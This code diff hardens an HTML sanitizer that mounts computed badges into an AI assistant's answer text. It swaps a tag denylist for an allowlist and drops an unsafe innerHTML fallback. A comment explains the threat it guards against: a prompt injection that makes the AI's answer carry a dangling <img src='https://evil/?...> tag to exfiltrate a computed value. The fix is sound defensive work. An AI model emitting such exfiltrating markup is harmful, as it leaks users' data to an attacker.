@@ -661,32 +661,28 @@
   }
 
   /**
-   * Safely mounts locally computed HTML badges without XSS injection or ProseMirror corruption.
+   * Mounts locally computed badges. The input is the AI's answer text (which a prompt injection can
+   * fill with markup, e.g. a dangling <img src='https://evil/? that would carry the computed real
+   * value off) with our badge spans spliced in. Allowlist: only our own badge spans stay elements,
+   * with only class/data-expr/title; any other markup goes back to the plain text it was on screen.
    */
+  const BADGE_CLASSES = ["ss-local-compute", "ss-katex-hydrated"];
+  const BADGE_ATTRS = ["class", "data-expr", "title"];
   function sanitizeAndMountHydration(node, htmlStr) {
     try {
-      const parser = new DOMParser();
-      const doc = parser.parseFromString(htmlStr, "text/html");
-      // Strip dangerous tags
-      const dangerous = doc.querySelectorAll("script, iframe, object, embed, style, link, meta");
-      dangerous.forEach(el => el.remove());
-
-      // Strip event handlers and javascript: URLs
-      const allEls = doc.querySelectorAll("*");
-      allEls.forEach(el => {
-        for (let i = el.attributes.length - 1; i >= 0; i--) {
-          const attr = el.attributes[i];
-          const attrName = attr.name.toLowerCase();
-          const attrVal = (attr.value || "").toLowerCase();
-          if (attrName.startsWith("on") || attrVal.startsWith("javascript:") || attrName === "srcdoc") {
-            el.removeAttribute(attr.name);
-          }
+      const doc = new DOMParser().parseFromString(htmlStr, "text/html");
+      const clean = (parent) => {
+        for (const el of Array.from(parent.children)) {
+          const isBadge = el.tagName === "SPAN" && BADGE_CLASSES.some(c => el.classList.contains(c));
+          if (!isBadge) { el.replaceWith(doc.createTextNode(el.outerHTML)); continue; }
+          for (const a of Array.from(el.attributes)) if (!BADGE_ATTRS.includes(a.name)) el.removeAttribute(a.name);
+          clean(el);
         }
-      });
-
+      };
+      clean(doc.body);
       node.replaceChildren(...doc.body.childNodes);
     } catch (_) {
-      node.innerHTML = htmlStr;
+      // Leave the answer as it was rather than mount anything unchecked
     }
   }
 
